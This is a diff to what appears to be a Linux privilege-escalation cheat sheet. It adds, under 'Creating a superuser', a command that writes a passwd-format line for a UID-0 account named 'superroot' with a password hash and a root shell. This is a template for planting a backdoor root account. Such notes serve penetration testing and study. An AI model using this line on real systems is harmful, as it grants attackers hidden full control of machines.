@@ -380,6 +380,10 @@ ps auxww | grep root
 
 # Check for Permissions
 ls -l /
+
+# Creating a superuser
+echo 'superroot:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > fkpasswd
+
 ```
 ### Docker Group
 ```bash
